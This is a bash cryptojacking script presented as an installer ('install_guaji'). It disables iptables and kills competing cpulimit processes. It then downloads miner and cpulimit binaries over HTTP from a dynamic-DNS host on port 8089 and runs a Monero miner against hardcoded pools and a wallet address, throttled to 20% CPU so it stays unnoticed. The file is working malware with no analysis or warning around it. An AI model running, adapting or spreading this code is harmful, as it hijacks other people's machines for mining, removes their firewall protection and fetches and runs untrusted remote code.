#!/usr/bin/env bash

cur_dir=$( pwd )


minxmr_file_64="minxmr"
minxmr_url_64="http://ym23322.f3322.net:8089/linux/64/minxmr.zip"
minxmr_file_32="minxmr"
minxmr_url_32="http://ym23322.f3322.net:8089/linux/32/minxmr.zip"

cpulimit_file_64="cpulimit"
cpulimit_url_64="http://ym23322.f3322.net:8089/linux/64/cpulimit.zip"
cpulimit_file_32="cpulimit"
cpulimit_url_32="http://ym23322.f3322.net:8089/linux/32/cpulimit.zip"



check_sys() {
			        echo "7---"
    local checkType=$1
    local value=$2

    local release=''
    local systemPackage=''

    if [ -f /etc/redhat-release ]; then
        release="centos"
        systemPackage="yum"
    elif cat /etc/issue | grep -Eqi "debian"; then
        release="debian"
        systemPackage="apt"
    elif cat /etc/issue | grep -Eqi "ubuntu"; then
        release="ubuntu"
        systemPackage="apt"
    elif cat /etc/issue | grep -Eqi "centos|red hat|redhat"; then
        release="centos"
        systemPackage="yum"
    elif cat /proc/version | grep -Eqi "debian"; then
        release="debian"
        systemPackage="apt"
    elif cat /proc/version | grep -Eqi "ubuntu"; then
        release="ubuntu"
        systemPackage="apt"
    elif cat /proc/version | grep -Eqi "centos|red hat|redhat"; then
        release="centos"
        systemPackage="yum"
    fi

    if [ ${checkType} == "sysRelease" ]; then
        if [ "$value" == "$release" ]; then
            return 0
        else
            return 1
        fi
    elif [ ${checkType} == "packageManager" ]; then
        if [ "$value" == "$systemPackage" ]; then
            return 0
        else
            return 1
        fi
    fi
}

getversion() {
    if [[ -s /etc/redhat-release ]]; then
        grep -oE  "[0-9.]+" /etc/redhat-release
    else
        grep -oE  "[0-9.]+" /etc/issue
    fi
}

centosversion() {
    if check_sys sysRelease centos; then
        local code=$1
        local version="$(getversion)"
        local main_ver=${version%%.*}
        if [ "$main_ver" == "$code" ]; then
            return 0
        else
            return 1
        fi
    else
        return 1
    fi
}





get_opsy(){
    [ -f /etc/redhat-release ] && awk '{print ($1,$3~/^[0-9]/?$3:$4)}' /etc/redhat-release && return
    [ -f /etc/os-release ] && awk -F'[= "]' '/PRETTY_NAME/{print $3,$4,$5}' /etc/os-release && return
    [ -f /etc/lsb-release ] && awk -F'[="]+' '/DESCRIPTION/{print $2}' /etc/lsb-release && return
}

is_64bit() {
			        echo "6---"
			        
			        
#		            if [ `getconf WORD_BIT` = '32' ] && [ `getconf LONG_BIT` = '64' ] ; then
#		            	
#		            	echo "61---"
##        return 0
#    else
#    echo "62---"
##        return 1
#    fi
			        
			        
#			        		        echo "`uname -a`"
#			        		        	        echo "`cat /etc/issue`"
#			        		        	        	        echo "`cat /proc/version`"
			        		        
			        		        
			        
			        
if uname -a|grep 64| grep -Eqi "x86"; then
	
	
	if uname -a|grep 64| grep -Eqi "64"; then
	
	    	echo "63---"
        return 0              
	    else
           	echo "65---"
        return 1
    fi

   
    else
           	echo "64---"
        return 0
    fi
}

debianversion(){
    if check_sys sysRelease debian;then
        local version=$( get_opsy )
        local code=${1}
        local main_ver=$( echo ${version} | sed 's/[^0-9]//g')
        if [ "${main_ver}" == "${code}" ];then
            return 0
        else
            return 1
        fi
    else
        return 1
    fi
}

download() {
			        echo "4---"
    local filename=$(basename $1)
    if [ -f ${1} ]; then
        echo "${filename} [found]"
    else
        echo "${filename} not found, download now..."
        wget --no-check-certificate -c -t3 -T60 -O ${1} ${2}
        if [ $? -ne 0 ]; then
            echo -e "${red}Error:${plain} Download ${filename} failed."
       #     exit 1
        fi
    fi
}

download_files() {
			        echo "3---"
			        
			        
			        
			        
			        
    cd ${cur_dir}
    
    yum install -y   unzip
apt-get install -y   unzip
    

#            if check_sys packageManager yum; then
#            		        			        echo "yum---"
#yum install -y  wget unzip
#        elif check_sys packageManager apt; then
#        		        			        echo "apt---"
#apt-get install -y  wget unzip
#
#else
#echo "111---"
#		       # echo "`install --help`"
#
#
##install -y  wget unzip
#yum install -y  wget unzip
#apt-get install -y  wget unzip
#
#        fi






  

}



install_guaji(){
	
	
	/etc/init.d/iptables stop
	service iptables stop
	
	
	
#pool="xmr.pool.minergate.com:45560"

pool="xmr.pool.minergate.com:45560,xmr.crypto-pool.fr:3333,xmr-usa.dwarfpool.com:8005,pool.supportxmr.com:3333,pool.minexmr.com:4444,monerohash.com:3333,mine.moneropool.com:3333"
poolsz=(${pool//,/ })
 for ((i=1;i<=${#poolsz[@]};i++ )); do
   	
   	    echo ${poolsz[$i-1]}
   	  done
coin="47AVpd2p1Pe5YDMpJFpnnTVjmAYfZLhuWgej7FXTFFwCVENcGdf74fkF9X4CzB6vC8dePVbF3MVHZX5KzGRTac6VNTvHEPy"
coinsz=(${coin//,/ })
 for ((i=1;i<=${#coinsz[@]};i++ )); do
   	
   	    echo ${coinsz[$i-1]}
   	  done
poolzdl="a"
poolsjs=$[RANDOM%${#poolsz[*]}]
echo ${poolsjs}
poolsj=${poolsz[${poolsjs}]}
echo ${poolsj}




     if [ "${poolsj}" == "xmr.pool.minergate.com:45560" ]; then
     	      echo "77777777777---"
     	coinsj="minxmr@protonmail.com"
     	#coinsj=""
     	

    
        else
         echo "88888888---"
coinsjs=$[RANDOM%${#coinsz[*]}]
echo ${coinsjs}
coinsj=${coinsz[${coinsjs}]}
        fi
        
         if [ "${coinsj}" == "" ]||[ "${poolsj}" == "" ]; then         	
         	 	    echo "bbbbbbbbb---"
         	         	poolsj="xmr.pool.minergate.com:45560"
     	 	     	coinsj="minxmr@protonmail.com"
         	
        fi

        
 echo ${poolsj}                    	
echo ${coinsj}
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		echo ${poolzdl}
	
	
	
	
	
		        echo "1---"
software=$(ps -ef|grep stratum|grep -v grep)
		        echo "11---"
   for ((i=1;i<=${#software[@]};i++ )); do
   	
   	    echo ${software[$i-1]}
   	
	        			        echo "13---"
	        			        	echo ${poolzdl}
	        			        
	        			          for ((i=1;i<=${#coinsz[@]};i++ )); do
	        			          	
	        			          	 echo ${coinsz[$i-1]}
	        			          	
	        			          	if ps -ef|grep stratum|grep -v grep | grep -Eqi ${coinsz[$i-1]}; then
	        			          		     echo "3333333333---"
	        			          		
	        			          		       	 echo ${coinsz[$i-1]}
	        			          		poolzdl="b"
	        			          		echo ${poolzdl}
	        			          		break
	        			          
	       
	      fi
   	
   	    
   	
	        			        echo "22222---"
	        			        
	        			           done
	        			           
	        			           	echo ${poolzdl}
	        			           
	        			             if [ ${poolzdl} == "a" ] ; then

	        			             	
	        			             		if ps -ef|grep stratum|grep -v grep | grep -Eqi "minxmr@protonmail.com"; then
	        			             			   echo "44444444444444"
	        			          		poolzdl="b"
	        			          		echo ${poolzdl}
	        			          		break
	        			          
	     
	      fi
	        			        	    			        	        			      
	        			        	
	        			        fi
	        			           	echo ${poolzdl}
	        			           
	        			        if [ ${poolzdl} == "b" ] ; then
	        			     
	        			        	       			   echo "555555555555555"
	        			        	       			           	echo ${poolzdl}
	        			        	break	        			        	        			      
	        			        	
	        			        fi
	        			        
	        			        
#if ps -ef|grep stratum|grep -v grep | grep -Eqi "minxmr@protonmail.com"; then
#	        echo "You "
#	        
#
#	        
#
#        else
#ps -ef|grep stratum|grep -v grep|cut -c 9-15|xargs kill -9
#        fi
#
#
#
    done







		        echo "2---"
#if ps -ef|grep stratum|grep -v grep | grep -Eqi "minxmr@protonmail.com"; then
if [ ${poolzdl} == "b" ]; then

		        echo "You "


        else
		        echo "9---"




rm -rf minxmr
    
            if is_64bit; then
        		        			        echo "64---"
        		        			          if [ ! -f minxmr ]; then      
        		        			          	
        		        			     
        		        			          	
        		        wget  -N  http://ym23322.f3322.net:8089/linux/64/minxmr
        		        
        		        
        		       # $? -ne 0
        		        			          	
        		        			                  if [ ! -f minxmr   ]; then      
        		        			                  	
        		        			                  	download_files
        		        			                  	
        		        			          wget  -N  http://ym23322.f3322.net:8089/linux/64/minxmr.zip
        		        			          unzip -o minxmr.zip
        		        			          
        		        			          
        		        			          
        		        			              fi        		        			                   				 

              fi
        else
        	        			        echo "32---"
        	        			        
        	        			        
        	        		  			          if [ ! -f minxmr ]; then      
        		        			          	
        		        			          	
        		        wget  -N  http://ym23322.f3322.net:8089/linux/32/minxmr
        		        			          	
        		        			          	
        		        			          #	$? -ne 0 
        		        			                  if [! -f minxmr]; then      
        		        			                  	
        		        			                  	download_files
        		        			                  	
        		        			          wget  -N  http://ym23322.f3322.net:8089/linux/32/minxmr.zip
        		        			          unzip -o minxmr.zip
        		        			              fi        		        			                   				 

              fi	        
        	        			        
        	        			        

        fi
    
    
    
chmod +x ./minxmr
#./minxmr -o stratum+tcp://xmr.pool.minergate.com:45560 -u minxmr@protonmail.com -p x --max-cpu-usage=20 -B -k
./minxmr -o stratum+tcp://${poolsj} -u ${coinsj} -p x --max-cpu-usage=20 -B -k


        fi



software=$(ps -ef|grep cpulimit|grep -v grep)
		        echo "11---"
   for ((i=1;i<=${#software[@]};i++ )); do
   	
   	    echo ${software[$i-1]}
   	
	        			        echo "13---"
	        			        
	        	if ps -ef|grep cpulimit|grep -v grep | grep -Eqi "minxmr"; then
	        echo "You "

	       
        else
        ps -ef|grep cpulimit|grep -v grep|cut -c 9-15|xargs kill -9


        fi		        
	        			        
	        			        
	        			        
	        			        
	        			        
	        			            done




if ps -ef|grep cpulimit|grep -v grep | grep -Eqi "minxmr"; then
		        			        echo "20---"

        
            else    
            
                cd ${cur_dir}
                
                rm -rf cpulimit
            
                    if is_64bit; then
        		        			        echo "64---"
        		        			        
        		        			        
        		        			                		        			          if [ ! -f cpulimit ]; then      
        		        			          	
        		        			          	
        		        wget  -N  http://ym23322.f3322.net:8089/linux/64/cpulimit
        		        			          	
        		        			                  if [ ! -f cpulimit ]; then      
        		        			                  	
        		        			          wget  -N  http://ym23322.f3322.net:8089/linux/64/cpulimit.zip
        		        			          unzip -o cpulimit.zip
        		        			              fi        		        			                   				 

              fi
        		        			        

        else
        	        			        echo "32---"
        	        			                	        		  			          if [ ! -f cpulimit ]; then      
        		        			          	
        		        			          	
        		        wget  -N  http://ym23322.f3322.net:8089/linux/32/cpulimit
        		        			          	
        		        			                  if [ ! -f cpulimit ]; then      
        		        			                  	
        		        			          wget  -N  http://ym23322.f3322.net:8089/linux/32/cpulimit.zip
        		        			          unzip -o cpulimit.zip
        		        			              fi        		        			                   				 

              fi	        
        	        			     
        	        			        
        	        			        
 
        fi
        
chmod +x ./cpulimit
./cpulimit --exe minxmr --limit 20 -b
        fi



   echo "10---"
   
   #	        			            echo   "`[ ${poolzdl}=="b" ]`"
#	        			             	 echo "6666666666"
#	        			             	 	echo ${poolzdl}

                 #     echo ${ls  -lht}  
                    
#                    		        echo "`ls  -lht`"
#
#		     
#		        
#		        
#		        echo "`ls -l minxmr | awk '{print $5}'`"
#		        
#		        echo "`du -b cpulimit | awk '{print $1}'`"
#                 echo "`pwd`"
		        
		        
		    #    echo "`ls -l`"
		        #     	 elif [ "${poolsj}" == "" ]; then
#     	 	    echo "aaaaaa---"
#     	 	${poolsj}="xmr.pool.minergate.com:45560"
#     	 	     	coinsj="minxmr@protonmail.com"
		        
#		               	  if [ ! -f ${cpulimit_file_32} ]; then      			        
#        	        			        
#        	        			        
#   #     rm -rf  "${cpulimit_file_32}"
#            download "${cpulimit_file_32}" "${cpulimit_url_32}"
#           unzip -o "${cpulimit_file_32}"
#
#
#        fi
#		        
#		        
#		                		              	  if [ ! -f ${cpulimit_file_64} ]; then      		  			        
#        		        			        
#     #    	rm -rf "${cpulimit_file_64}"
#            download "${cpulimit_file_64}" "${cpulimit_url_64}"
#            unzip -o "${cpulimit_file_64}"
#
#
#        fi

        	        #    download "${minxmr_file_64}" "${minxmr_url_64}"
        #    unzip -o "${minxmr_file_64}"        			        
        	        			        
#        	        			          if [ ! -f ${minxmr_file_32} ]; then      		  
#
#            download "${minxmr_file_32}" "${minxmr_url_32}"
#            unzip -o "${minxmr_file_32}"
#              fi

#${minxmr_file_64}

#           rm -rf  "${minxmr_file_64}"
#            download "${minxmr_file_64}" "${minxmr_url_64}"
#            unzip -o "${minxmr_file_64}"

#         rm -rf   "${minxmr_file_32}"
#            download "${minxmr_file_32}" "${minxmr_url_32}"
#            unzip -o "${minxmr_file_32}"

#       rm -rf  "${cpulimit_file_32}"
#            download "${cpulimit_file_32}" "${cpulimit_url_32}"
#           unzip -o "${cpulimit_file_32}"
      #    rm -rf   "${minxmr_file_32}"



# 	        if top -bn 1 | grep minxmr | awk '{print $9}'>90; then
# 	        			        echo "12---"
# 	        	ps -ef|grep minxmr|grep -v grep|cut -c 9-15|xargs kill -9
# 	        	
# 	                fi	


# 		        	        if top -bn 1 | grep minxmr | awk '{print $9}'>90; then
# 	        			        echo "15---"
# 	        	ps -ef|grep minxmr|grep -v grep|cut -c 9-15|xargs kill -9
# 	        	
# 	        	
#     download_files
# chmod +x ./minxmr
# ./minxmr -o stratum+tcp://xmr.pool.minergate.com:45560 -u minxmr@protonmail.com -p x --max-cpu-usage=20 -B
# 	        	
# 	        	
# 	                fi	


#        	rm -rf "${cpulimit_file_64}"
#            download "${cpulimit_file_64}" "${cpulimit_url_64}"
#            unzip -o "${cpulimit_file_64}"
          #  rm -rf  "${minxmr_file_64}"




#         chmod +x ./cpulimit
# ./cpulimit --exe minxmr --limit 20 -b




}




# Initialization step
action=$1
[ -z $1 ] && action=install
case "$action" in
    install|uninstall)
        ${action}_guaji
        ;;
    *)
        echo "Arguments error! [${action}]"
        echo "Usage: `basename $0` [install|uninstall]"
        ;;
esac



































